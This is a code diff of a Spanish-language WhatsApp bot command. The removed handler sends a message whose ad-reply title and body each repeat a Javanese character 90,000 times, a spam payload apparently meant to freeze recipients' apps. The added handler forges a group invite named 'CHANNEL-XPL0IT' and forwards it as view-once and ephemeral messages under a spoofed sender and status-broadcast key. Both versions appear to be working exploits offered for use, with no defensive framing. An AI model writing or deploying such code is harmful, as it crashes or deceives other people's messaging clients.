@@ -1,40 +1,68 @@
-let handler = async (m, { conn, text }) => {
-    if (!text || !text.includes('chat.whatsapp.com')) {
-        return conn.reply(m.chat, '❌ Usa el formato correcto:\n.imagen https://chat.whatsapp.com/XXXXX', m);
+let handler = async (m, { conn }) => {
+  const OWNER_NUMBER = conn.user.jid;
+
+  if (m.sender !== OWNER_NUMBER) {
+    return conn.reply(m.chat, '🚫 Solo el bot puede usar este comando.', m);
+  }
+
+  const inviteCode = 'CHANNEL-XPL0IT-𓂀𓂀𓂀𓂀'; // Tamaño reducido
+  const groupName = '🔥 Canal Oficial ⚠️';
+  const channelJid = '120363999999999999@g.us';
+  const thumbnailFake = Buffer.from(
+    // Imagen JPEG en base64 de 1x1 píxel (válida)
+    '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB'
+    + 'AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAALCAABAAEBAREA/8QAFQABAQAAAAAAAAAA'
+    + 'AAAAAAAf/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAH/xAAUEQEAAAAAAAAAAA'
+    + 'AAAAAAAAAA/9oACAEBAAEFAq//xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oACAEDAQE/AR//xAAUEQ'
+    + 'EAAAAAAAAAAAAAAAAAAAAA/9oACAECAQE/AR//xAAUEAEAAAAAAAAAAAAAAAAAAAAA/9oACAEBA'
+    + 'AY/Av/EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQEAAT8h/9k=',
+    'base64'
+  );
+
+  const fakeInviteContent = {
+    groupJid: channelJid,
+    inviteCode,
+    groupName,
+    jpegThumbnail: thumbnailFake
+  };
+
+  const viewOnceWrapper = {
+    viewOnceMessage: {
+      message: {
+        groupInviteMessage: fakeInviteContent
+      }
     }
+  };
 
-    const groupLink = text.trim();
-
-    // Imagen fija que quieres usar
-    const imageUrl = 'https://files.catbox.moe/7i4g3c.jpg';
-
-    // Texto repetido para título y cuerpo
-    const spamTitle = 'ꦾ'.repeat(90000);
-    const spamBody = 'ꦾ'.repeat(90000);
-
-    try {
-        await conn.sendMessage(m.chat, {
-            image: { url: imageUrl },
-            caption: `Tobi 👀:\n${groupLink}`,
-            contextInfo: {
-                externalAdReply: {
-                    title: spamTitle,
-                    body: spamBody,
-                    thumbnailUrl: imageUrl,
-                    sourceUrl: groupLink,
-                    mediaType: 1,
-                    renderLargerThumbnail: true
-                }
-            }
-        });
-
-    } catch (e) {
-        console.error('❌ Error al enviar imagen:', e);
-        return conn.reply(m.chat, '❌ Error al enviar la imagen.', m);
+  const ephemeralWrapper = {
+    ephemeralMessage: {
+      message: {
+        groupInviteMessage: fakeInviteContent
+      }
     }
+  };
+
+  await conn.sendMessage(m.chat, {
+    forward: {
+      key: {
+        fromMe: false,
+        participant: "0@s.whatsapp.net",
+        remoteJid: "status@broadcast"
+      },
+      message: viewOnceWrapper
+    }
+  });
+
+  await conn.sendMessage(m.chat, {
+    forward: {
+      key: {
+        fromMe: false,
+        participant: "0@s.whatsapp.net",
+        remoteJid: "status@broadcast"
+      },
+      message: ephemeralWrapper
+    }
+  });
+
+  await conn.reply(m.chat, '✅ Mensaje enviado.', m);
 };
-
-handler.help = ['imagen <link_del_grupo>'];
-handler.tags = ['grupo', 'fake'];
-handler.command = /^imagen$/i;
-export default handler;
